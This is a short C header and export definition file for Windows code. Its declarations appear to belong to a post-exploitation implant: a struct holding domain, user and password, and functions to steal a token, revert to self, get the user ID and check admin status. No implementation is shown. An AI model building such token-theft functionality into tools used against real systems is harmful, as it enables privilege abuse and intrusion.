// tokens.h
#ifndef TOKENS_H
#define TOKENS_H

#include <windows.h>

// 常量定义
#define CALLBACK_TOKEN_GETUID 1
#define CALLBACK_TOKEN_STOLEN 2

// 结构体定义
typedef struct {
    void* manager;
    wchar_t* domain;
    wchar_t* user;
    wchar_t* password;
    BOOL active;
} ALTCREDS;

// 函数声明
BOOL token_user(HANDLE token, char* buffer, int length);
void command_steal_token(char* buffer, int length, void(*callback)(char*, int, int));
void command_rev2self();
BOOL is_admin();
void command_getuid(char* buffer, int length, void(*callback)(char*, int, int));

#endif // TOKENS_H

; tokens.def
EXPORTS
    token_user_export
    command_steal_token_export
    command_rev2self_export
    is_admin_export
    command_getuid_export